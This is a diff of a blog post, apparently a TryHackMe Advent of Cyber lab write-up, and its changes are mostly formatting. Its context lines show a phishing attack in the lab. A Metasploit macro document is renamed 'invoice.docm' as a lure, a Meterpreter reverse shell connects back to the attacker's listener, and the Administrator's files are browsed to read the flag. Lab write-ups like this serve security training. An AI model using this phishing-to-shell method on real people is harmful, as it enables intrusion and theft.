@@ -1,7 +1,7 @@
 ---
 title: Day 10 He had a brain full of macros, and had shells in his soul.
-date: 2024-12-14 00:00:00
-categories: Cybersecurity Tryhackme
+date: 2024-12-14 00:00:00 +0200
+categories: [Cybersecurity, Tryhackme]
 tags:
   - Advent_of_cyber
   - THM
@@ -80,7 +80,8 @@ Exploit target:
 
 
 View the full module info with the info, or info -d command.
-  ```
+```
+{: .nolineno }
 
 - `exploit` 
   generates a macro and embeds it in a document
@@ -118,7 +119,8 @@ View the full module info with the info, or info -d command.
 └─$ mv msf.docm /home/kali/Desktop           
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ mv msf.docm invoice.docm
-```   
+```
+{: .nolineno }   
 
 1. after send the document you will see in `msfconsle` 
 
@@ -127,11 +129,15 @@ View the full module info with the info, or info -d command.
 [*] Sending stage (176198 bytes) to 10.10.242.146
 [*] Meterpreter session 1 opened (10.9.4.230:8888 -> 10.10.242.146:50185) at 2024-12-19 00:17:45 +0200
 ```
+{: .nolineno }
+
 
 1. you can see that the `msf6` turn into `meterpreter >` that mean the connection established and we are in the victim PC 
 2. to find flag navigate to Desktop by
 
 ```shell-session
+{: .nolineno }
+
 meterpreter > cd c:/users/Administrator/Desktop
 meterpreter > ls
 Listing: c:\users\Administrator\Desktop
@@ -152,5 +158,6 @@ meterpreter > cat flag.txt
 THM{PHISHING_CHRISTMAS}
 meterpreter >
 ```
+{: .nolineno }
 
 1. So the flag is `THM{PHISHING_CHRISTMAS}`
